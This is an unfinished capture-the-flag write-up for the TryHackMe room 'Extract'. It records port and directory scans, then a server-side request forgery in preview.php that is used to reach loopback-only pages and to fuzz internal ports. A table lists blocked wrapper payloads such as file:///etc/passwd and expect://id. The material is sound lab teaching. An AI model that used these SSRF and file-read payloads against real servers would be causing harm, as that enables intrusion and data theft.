# Extract: Write-up (In Progress)

**Platform:** TryHackMe  
**Room:** Extract *(Premium)* **Target:** CVSSM1 v.1.4  
**Difficulty:** Hard  
**Goal:** Exploiting SSRF and internal service enumeration to achieve initial access.

---

## Reconnaissance

### Service Discovery
A full port scan identified two externally exposed services:

```bash
└─$ nmap -n -Pn -p- --min-rate 500 -T4 <TARGET_IP>
```

**Results:**
- **22/tcp:** OpenSSH 9.6p1
- **80/tcp:** Apache httpd 2.4.58 (TryBookMe: Online Library)

### Web Enumeration
Directory discovery identified standard paths and a core endpoint for content rendering:

```bash
└─$ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt 
```

**Identified Paths:**
- `/management/` (Status: 301)
- `preview.php` (Status: 200): *Acts as a fetcher/renderer for remote PDF content.*

---

## Vulnerability Research: SSRF

### Client-Side Analysis
Analysis of the `index.php` source code revealed a JavaScript function that constructs requests to a backend endpoint. This function passes a user-controlled URL to `preview.php`:

```html
<script>
function openPdf(url) {
    const iframe = document.getElementById('pdfFrame');
    iframe.src = 'preview.php?url=' + encodeURIComponent(url);
    iframe.style.display = 'block';
}
</script>
```

### Server-Side Request Forgery (SSRF) Validation
The `preview.php` endpoint fetches the resource specified in the `url` parameter and returns it within the response body. 

**Establishing Internal Context:**
By pointing the URL to the loopback interface (`127.0.0.1`), I confirmed the backend could reach its own web service.

```bash
└─$ curl -i "http://<TARGET_IP>/preview.php?url=[http://127.0.0.1/](http://127.0.0.1/)"
```

**Evidence:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<title>TryBookMe - Online Library</title>
...
```
*Note: The response confirmed that requests to the loopback reach the same Apache service, confirming the SSRF vector.*

---

## Internal Enumeration via SSRF

### Leveraging Loopback Trust Boundary
The SSRF primitive allowed access to administrative Apache endpoints and internal interfaces restricted to the loopback interface.

```bash
└─$ curl -i "http://<TARGET_IP>/preview.php?url=[http://127.0.0.1/server-status](http://127.0.0.1/server-status)"
```
**Result:** Apache server-status page successfully retrieved.

### Internal Port Scanning
A focused port scan was conducted through the SSRF vector to identify services not bound to the external interface:

```bash
└─$ ffuf -w ports_list.txt -u "http://<TARGET_IP>/preview.php?url=[http://127.0.0.1](http://127.0.0.1):FUZZ" -fs 0
```

**Key Finding:**
- **Port 10000:** Returned a distinct HTTP response, identified as the **TryBookMe API**.

### Analyzing the Internal API (Port 10000)
Inspection of the internal service on port 10000 revealed a modern web framework through observed `_next/static/` references in the HTML.

```bash
└─$ curl -s "http://<TARGET_IP>/preview.php?url=[http://127.0.0.1:10000/](http://127.0.0.1:10000/)"
```

**Observations:**
- **Framework:** Next.js (indicated by `buildId: "k9Pjo5x24QkUE90SdyHNw"`).
- **Endpoints:** Mentions of a `/customapi` route in the frontend logic.

---

## Filter and Wrapper Analysis

The backend implements a keyword-based blacklist filter on the `url` parameter. Any detected keyword triggers the response: `"URL blocked due to keyword"`.

| Attempted Wrapper/Scheme | Resulting Message | Status |
| :--- | :--- | :--- |
| `file:///etc/passwd` | "URL blocked due to keyword" | **BLOCKED** |
| `php://filter/...` | "URL blocked due to keyword" | **BLOCKED** |
| `data://text/plain;...` | "URL blocked due to keyword" | **BLOCKED** |
| `expect://id` | "URL blocked due to keyword" | **BLOCKED** |

**Current Assessment:**
The target filters the decoded URL string and currently only allows `http://` and `https://` schemes. Subsequent efforts will focus on exploring the logic of the internal `/customapi` on port 10000.

---
*Status: Under Construction: Investigation of internal API logic is ongoing.*

